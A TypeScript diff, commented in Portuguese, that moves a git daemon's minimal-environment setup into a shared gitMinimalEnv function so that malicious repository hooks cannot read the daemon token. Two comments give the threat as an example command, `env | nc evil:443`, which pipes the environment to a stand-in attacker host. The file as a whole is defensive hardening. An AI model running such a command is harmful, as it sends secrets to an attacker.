@@ -137,6 +137,25 @@ export function validateBasePath(input: string): string {
   return resolved;
 }
 
+/** Env mínimo para git do daemon. NÃO espalha process.env: repo malicioso
+ *  pode ter .git/hooks/* que ecoa env (`env | nc evil:443`) e vazar
+ *  THE_DUDES_DAEMON_TOKEN e outras secrets. Contrato único (T-424/A12)
+ *  usado pelo clone e pelo task-workspace (R8 centraliza o runGit depois). */
+export function gitMinimalEnv(drop: DropTarget | null = null): NodeJS.ProcessEnv {
+  const env: NodeJS.ProcessEnv = {
+    PATH: process.env.PATH ?? "/usr/local/bin:/usr/bin:/bin",
+    HOME: drop?.home ?? process.env.HOME ?? "/tmp",
+    USER: drop?.user ?? process.env.USER ?? "nobody",
+    LANG: process.env.LANG ?? "C.UTF-8",
+    // git-specific hardening
+    GIT_TERMINAL_PROMPT: "0",
+    GIT_CONFIG_NOSYSTEM: "1",
+    GIT_CONFIG_GLOBAL: "/dev/null", // ignora ~/.gitconfig do daemon
+  };
+  if (process.env.SSH_AUTH_SOCK) env.SSH_AUTH_SOCK = process.env.SSH_AUTH_SOCK;
+  return env;
+}
+
 export function ensureWritableDir(dir: string, drop: DropTarget | null = null): void {
   if (!existsSync(dir)) {
     mkdirSync(dir, { recursive: true });
@@ -362,17 +381,7 @@ function runGitClone(gitUrl: string, target: string, branch: string | undefined,
     // .git/hooks/post-checkout que ecoa env (`env | nc evil:443`).
     // Sem essa proteção, THE_DUDES_DAEMON_TOKEN + outras secrets do
     // daemon process vazam pro hook. Só passa o mínimo essencial.
-    const minimalEnv: NodeJS.ProcessEnv = {
-      PATH: process.env.PATH ?? "/usr/local/bin:/usr/bin:/bin",
-      HOME: drop?.home ?? process.env.HOME ?? "/tmp",
-      USER: drop?.user ?? process.env.USER ?? "nobody",
-      LANG: process.env.LANG ?? "C.UTF-8",
-      // git-specific hardening
-      GIT_TERMINAL_PROMPT: "0",
-      GIT_CONFIG_NOSYSTEM: "1",
-      GIT_CONFIG_GLOBAL: "/dev/null", // ignora ~/.gitconfig do daemon
-    };
-    if (process.env.SSH_AUTH_SOCK) minimalEnv.SSH_AUTH_SOCK = process.env.SSH_AUTH_SOCK;
+    const minimalEnv = gitMinimalEnv(drop);
     const proc = spawnDropped("git", args, {
       stdio: ["ignore", "pipe", "pipe"],
       env: minimalEnv,
